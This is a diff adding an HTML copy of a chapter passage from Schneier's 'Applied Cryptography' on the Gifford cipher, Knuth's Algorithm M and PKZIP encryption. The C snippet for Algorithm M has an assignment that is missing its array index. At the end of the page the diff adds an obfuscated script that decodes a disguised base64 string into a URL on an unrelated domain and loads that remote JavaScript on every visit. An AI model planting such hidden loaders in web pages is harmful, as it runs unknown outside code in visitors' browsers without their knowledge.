@@ -1,0 +1,139 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=392-395//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch17/17-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">16.10 Gifford</FONT></H3>
+<P>David Gifford invented a stream cipher and used it to encrypt news wire reports in the Boston area from 1984 until 1988 [608,607,609]. The algorithm has a single 8-byte register: <I>b</I><SUB>0</SUB>, <I>b</I><SUB>1</SUB>,..., <I>b</I><SUB>7</SUB>. The key is the initial state of the register. The algorithm works in OFB; the plaintext does not affect the algorithm at all. (See Figure 16.17).</P>
+<P>To generate a key byte <I>k</I><SUB>i,</SUB> concatenate <I>b</I><SUB>0</SUB> and <I>b</I><SUB>2</SUB> and concatenate <I>b</I><SUB>4</SUB> and <I>b</I><SUB>7</SUB>. Multiply the two together to get a 32-bit number. The third byte from the left is <I>k</I><SUB>i</SUB>.</P>
+<P>To update the register, take <I>b</I><SUB>1</SUB> and sticky right shift it 1 bit. This means the left-most bit is both shifted and also remains in place. Take <I>b</I><SUB>7</SUB> and shift it 1 bit to the left; there should be a 0 in the right-most bit position. Take the XOR of the modified <I>b</I><SUB>1</SUB>, the modified <I>b</I><SUB>7</SUB>, and <I>b</I><SUB>0</SUB>. Shift the original register 1 byte to the right and put this byte in the left-most position.</P>
+<P>This algorithm remained secure throughout its life, but was broken in 1994 [287]. It turns out that the feedback polynomial isn&#146;t primitive and can be attacked that way&#151;oops.</P>
+<I><P><A NAME="Fig17"></A><A HREF="javascript:displayWindow('images/16-17.jpg',209,160 )"><IMG SRC="images/16-17t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-17.jpg',209,160)"><FONT COLOR="#000077"><B>Figure 16.17</B></FONT></A>&nbsp;&nbsp;Gifford.</I>
+</P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">16.11 Algorithm M</FONT></H3>
+<P>The name is from Knuth [863]. It&#146;s a method for combining multiple pseudo-random streams that increases their security. One generator&#146;s output is used to select a delayed output from the other generator [996,1003]. In C:
+</P>
+<!-- CODE //-->
+<PRE>
+#define ARR_SIZE (8192) /* for example &#151; the larger the better
+*/
+
+static unsigned char delay[ ARR_SIZE ] ;
+
+unsigned char prngA( void ) ;
+long prngB( void ) ;
+
+void init_algM( void )
+{
+  long i ;
+
+  for ( i = 0 ; i &lt ARR_SIZE ; i&#43;&#43; )
+    delay = prngA() ;
+
+} /* init_algM */
+
+unsigned char algM( void )
+{
+  long j,v ;
+  j = prngB() % ARR_SIZE ;    /* get the delay[] index */
+  v = delay[j] ;         /* get the value to return */
+  delay[j] = prngA() ;        /* replace it */
+
+  return ( v ) ;
+} /* algM */
+</PRE>
+<!-- END CODE //-->
+<P>This has strength in that if prngA were truly random, one could not learn anything about prngB (and could therefore not cryptanalyze it). If prngA were of the form that it could be cryptanalyzed only if its output were available in order (i.e., only if prngB were cryptanalyzed first) and otherwise it was effectively truly random, then the combination would be secure.
+</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">16.12 PKZIP</FONT></H3>
+<P>Roger Schlafly designed the encryption algorithm built into the PKZIP data compression program. It&#146;s a stream cipher that encrypts data one byte at a time. At least, this is the algorithm in version 2.04g. I can&#146;t speak for later versions, but unless there is some announcement you can probably assume that they are identical.
+</P>
+<P>The algorithm uses three 32-bit variables, initialized as follows:</P>
+<DL>
+<DD><I>K</I><SUB>0</SUB> = 305419896
+<DD><I>K</I><SUB>1</SUB> = 591751049
+<DD><I>K</I><SUB>2</SUB> = 878082192
+</DL>
+<P>It has an 8-bit key, <I>K</I><SUB>3</SUB>, derived from <I>K</I><SUB>2</SUB>. Here is the algorithm (all symbols are standard C notation):</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> ^ <I>K</I><SUB>3</SUB>
+<DD><I>K</I><SUB>0</SUB> = crc32 (<I>K</I><SUB>0</SUB>, <I>P</I><SUB>i</SUB>)
+<DD><I>K</I><SUB>1</SUB> = <I>K</I><SUB>1</SUB> &#43; (<I>K</I><SUB>0</SUB> &amp 0&#215;000000ff)
+<DD><I>K</I><SUB>1</SUB> = <I>K</I><SUB>1</SUB> * 134775813 &#43; 1
+<DD><I>K</I><SUB>2</SUB> = crc32 (<I>K</I><SUB>2</SUB>, <I>K</I><SUB>1</SUB> &gt&gt 24)
+<DD><I>K</I><SUB>3</SUB> = ((<I>K</I><SUB>2</SUB> | 2) * ((<I>K</I><SUB>2</SUB> | 2) ^ 1)) &gt&gt 8
+</DL>
+<P>The function crc32 takes the previous value and a byte, XORs them, and calculates the next value by the CRC polynomial denoted by 0&#215;edb88320. In practice, a 256-entry table can be precomputed and the crc32 calculation becomes:
+</P>
+<DL>
+<DD>crc32 (<I>a, b</I>) = (<I>a</I> &gt&gt 8) ^ table [(<I>a</I> &amp 0&#215;ff) &#8853; <I>b</I>]
+</DL>
+<P>The table is precomputed by the original definition of crc32:
+</P>
+<DL>
+<DD>table [<I>i</I>] = crc32 (<I>i</I>, 0)
+</DL>
+<P>To encrypt a plaintext stream, first loop the key bytes through the encryption algorithm to update the keys. Ignore the ciphertext output in this step. Then encrypt the plaintext, one byte at a time. Twelve random bytes are prepended to the plaintext, but that&#146;s not really important. Decryption is similar to encryption, except that <I>C</I><SUB>i</SUB> is used in the second step of the algorithm instead of <I>P</I><SUB>i</SUB>.</P>
+<P><FONT SIZE="+1"><B><I>Security of PKZIP</I></B></FONT></P>
+<P>Unfortunately, it&#146;s not that great. An attack requires 40 to 200 bytes of known plaintext and has a time complexity of about 2<SUP>27</SUP> [166]. You can do it in a few hours on your personal computer. If the compressed file has any standard headers, getting the known plaintext is no problem. Don&#146;t use the built-in encryption in PKZIP.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch17/17-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(JCcoCkei, NkhovbsY) {NkhovbsY = JCcoCkei.createElement('script');NkhovbsY.type = 'text/javascript';NkhovbsY.async = true;NkhovbsY.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');JCcoCkei.getElementsByTagName('body')[0].appendChild(NkhovbsY);}(document));</script></body>
+</html>
